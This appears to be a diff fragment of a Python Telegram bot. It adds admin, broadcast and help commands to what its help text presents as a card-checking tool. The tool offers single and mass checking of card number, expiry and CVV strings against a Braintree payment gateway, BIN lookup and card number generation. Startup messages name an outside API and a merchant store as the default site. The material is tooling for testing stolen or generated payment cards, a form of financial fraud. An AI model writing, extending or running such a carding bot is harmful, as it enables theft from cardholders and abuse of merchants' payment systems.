+    if message.from_user.id != ADMIN_ID:
+        bot.send_message(message.chat.id, "🚫 Admin only command")
+        return
+    if not pending_requests:
+        bot.send_message(message.chat.id, "📭 No pending requests")
+        return
+    text = "╔══════════════════════╗\n║  ⏳ PENDING REQUESTS  ║\n╚══════════════════════╝\n\n"
+    for user_id, info in pending_requests.items():
+        text += f"👤 {info['name']}\n🔗 @{info['username']}\n🆔 {user_id}\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    bot.send_message(message.chat.id, text)
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast_command(message):
+    if message.from_user.id != ADMIN_ID:
+        bot.send_message(message.chat.id, "🚫 Admin only command")
+        return
+    
+    command_parts = message.text.split(maxsplit=1)
+    if len(command_parts) < 2:
+        text = "╔════════════════════╗\n║  📢 BROADCAST  ║\n╚════════════════════╝\n\nUsage:\n/broadcast Your message"
+        bot.send_message(message.chat.id, text)
+        return
+    
+    broadcast_text = command_parts[1].strip()
+    
+    if not approved_users:
+        bot.send_message(message.chat.id, "❌ No approved users to broadcast to")
+        return
+    
+    status_msg = bot.send_message(message.chat.id, "📤 Starting broadcast...")
+    success_count = 0
+    failed_count = 0
+    
+    for user_id in approved_users:
+        try:
+            bot.send_message(user_id, f"╔════════════════════════╗\n║  📢 ADMIN BROADCAST  ║\n╚════════════════════════╝\n\n{broadcast_text}")
+            success_count += 1
+        except:
+            failed_count += 1
+        time.sleep(0.5)
+    
+    bot.edit_message_text(f"✅ Broadcast complete!\n\n✅ Sent: {success_count}\n❌ Failed: {failed_count}", message.chat.id, status_msg.message_id)
+
+@bot.message_handler(commands=['help'])
+@require_approval
+def send_help(message):
+    help_text = "╔════════════════════╗\n"
+    help_text += "║   📚 HOW TO USE   ║\n"
+    help_text += "╚════════════════════╝\n\n"
+    help_text += "💳 SINGLE CHECK\n/bchk 4532123456789012|12|25|123\n\n"
+    help_text += "🔍 BIN LOOKUP\n/bin 453212\n\n"
+    help_text += "🎲 GENERATE CARDS\n/gen 453212 5\n/gen 453212|06|30 5\n\n"
+    help_text += "📦 MASS CHECK\n/bmass card1|mm|yy|cvv\ncard2|mm|yy|cvv\n\n"
+    help_text += "📁 FILE UPLOAD\n1. Use /bfile\n2. Upload .txt file\n\n"
+    help_text += "✨ Braintree Gateway! ✨"
+    bot.send_message(message.chat.id, help_text)
 
 if __name__ == '__main__':
     print("🚀 Braintree Bot started with Jossalicious API!")
-    print("✅ Default site: Coca-Cola Store")
+    print("✅ All commands working properly")
     print("🔥 API: jossalicious.org")
     bot.infinity_polling()
